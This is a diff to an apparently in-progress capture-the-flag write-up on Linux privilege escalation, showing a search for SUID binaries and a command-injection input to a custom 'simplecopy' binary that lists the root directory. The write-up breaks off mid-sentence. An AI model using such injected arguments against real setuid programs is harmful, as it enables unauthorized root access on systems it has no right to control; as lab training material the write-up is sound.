@@ -1,7 +1,7 @@
 # Objective 7: Linux PrivEsc
 **Location: Island of Misfit Toys: Ostrich Saloon**  
 
-The objective is to perform a privilege escalation in a Linux terminal session.
+The objective is to perform a privilege escalation in a Linux terminal session. Finally the binary `/root/runmetoanswer` has to be executed.
 The first approach is to find `suid` files on the file system:
 ```
 elf@745490537a8a:~$ find / -perm -4000 -ls 2>/dev/null
@@ -18,11 +18,22 @@ elf@745490537a8a:~$ find / -perm -4000 -ls 2>/dev/null
 
 `simplecopy`looks promising as this does usually not exist on Linux systems.
 
-Invoking this binary with some test arguments show inter
+Invoking this binary with some test arguments show interesting error messages:
+```
+elf@745490537a8a:~$ simplecopy "; ls -l /root" b
+cp: missing file operand
+Try 'cp --help' for more information.
+ls: cannot access 'b': No such file or directory
+/root:
+total 600
+-rws------ 1 root root 612560 Nov 9 21:29 runmetoanswer
+```
+
+So
 
 
 **Achievement: Linux PrivEsc**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjMyOTE0MDI1LC04MjYxNzg2ODQsLTIwMT
-AxOTI2M119
+eyJoaXN0b3J5IjpbMTI2NDY3ODA1MywtODI2MTc4Njg0LC0yMD
+EwMTkyNjNdfQ==
 -->
